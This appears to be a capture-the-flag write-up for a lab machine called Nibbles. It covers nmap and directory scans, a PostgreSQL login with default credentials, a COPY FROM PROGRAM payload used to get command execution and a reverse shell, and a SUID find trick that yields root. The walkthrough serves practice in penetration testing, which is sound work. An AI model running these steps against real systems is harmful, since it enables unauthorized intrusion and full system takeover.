## First Enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Sat Mar 23 15:21:09 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 21,22,80,5437 -Pn 192.168.227.47
Nmap scan report for 192.168.227.47
Host is up (0.20s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 23 15:21:31 2024 -- 1 IP address (1 host up) scanned in 21.73 seconds

```


## enumerating port 80

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/16224830-47a5-4121-a9bf-dca4baefb8ad)

a web server running on port 80, opening it on a browser, we got a webpage that talks about the html tags etc. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Nibbles]
└─$ feroxbuster -u http://192.168.227.47 -C 404,500,400,403 -k 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.227.47
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404, 500, 400, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      169l      550w     4115c http://192.168.227.47/page2.html
200      GET      208l     1213w    90445c http://192.168.227.47/pic.png
200      GET      849l     5242w   413918c http://192.168.227.47/nightmare.jpg
200      GET       30l      201w     1272c http://192.168.227.47/
[####################] - 2m     30003/30003   0s      found:4       errors:28     
[####################] - 2m     30000/30000   208/s   http://192.168.227.47/
```
fuzzing for hidden dirs, we got nothing really useful for use. 


## Enumerating port 5437 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/57053bd3-84c7-402e-9eec-d199481e0ada)

from our scan we can see it is running ` postgresql PostgreSQL DB 11.3 - 11.9`. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Nibbles]
└─$ psql -h 192.168.227.47 -p 5437 -U postgres
Password for user postgres: 
psql (16.2 (Debian 16.2-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# 
```
trying to login using default credential `postgres:postgres` and it was success. let's leverage this db server to spawn a shell. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/456b473e-e0e4-4c32-9b81-ac01421b287a)

Triggering RCE through `postgresql` server. Let's spawn a reverse shell 

>Payload

```
drop table if exists cmd_exec;
create table cmd_exec(cmd_output text);
copy cmd_exec from program 'COMMAND';
```
payload to trigger RCE on a postgresql db server. let's spawn a reverse shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c06d35dc-c852-4d63-a160-3f69b9e12af2)

We got a reverse shell. 



## Privilege Escalation 

```shell
postgres@nibbles:/var/lib/postgresql/11/main$ cd
bash: cd: HOME not set
postgres@nibbles:/var/lib/postgresql/11/main$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/sudo
/usr/bin/umount
postgres@nibbles:/var/lib/postgresql/11/main$
```
looking for suid, we can see a valid `/usr/bin/find` bin we can leverage to get root. let's abuse it. 

```
postgres@nibbles:/tmp$ find . -exec /bin/sh -p \; -quit
# whoami 
root
# id
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
# 
```
and we got root. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0759e911-ff3e-4a14-a74b-23977f5fa28a)

And we are through 
